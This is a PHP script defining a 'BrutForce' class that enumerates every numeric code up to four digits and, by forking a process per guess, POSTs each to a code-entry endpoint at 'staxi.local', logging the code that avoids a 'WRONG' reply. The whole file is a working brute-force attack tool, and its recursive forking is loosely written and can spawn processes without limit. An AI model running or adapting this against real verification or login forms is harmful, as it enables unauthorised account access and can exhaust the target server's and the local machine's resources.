<?php

class BrutForce{

    public $chars = [1, 2, 3, 4, 5, 6, 7, 8, 9,0];

    public $pids = [];

    public $indexes=0;

    public $output;

    public function send($code)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, "http://staxi.local/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"code=" . $code);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $xml = curl_exec($ch);

        curl_close($ch);

        if (strpos($xml, 'WRONG =(') == false) {

            $file = 'result.txt';
            $content = file_get_contents($file);
            $p = $this->pids[0];
            $result = $content.'Code is: '.$code.' '.date("h:i:sa");

            file_put_contents($file, $result);

//            posix_kill(14527);
            die;
        }
    }


    public function generate($chars, $size, $combinations = array())
    {
        if (empty($combinations)) {
            $combinations = $chars;
        }

        if ($size == 1) {
            return $combinations;
        }

        $new_combinations = array();

        foreach ($combinations as $combination) {
            foreach ($chars as $char) {
                $new_combinations[] = $combination . $char;
            }
        }

        return $this->generate($chars, $size - 1, $new_combinations);

    }

    public function forkes(){

        $this->pids[$this->indexes] = pcntl_fork();

        if ($this->pids[$this->indexes] == 0) {
            $this->indexes++;
            $this->forkes();
        } else {
            $this->send($this->output[$this->indexes]);
            pcntl_wait($status);
        }
    }

    public function perform($dimension){
        $this->output = $this->generate($this->chars, $dimension);
        $file = 'result.txt';
        $result = date("h:i:sa");
        file_put_contents($file, $result);
        $this->forkes();
    }
}

$brutForce = new BrutForce();
for ($p=1; $p<5; $p++) {
    $brutForce->perform($p);
}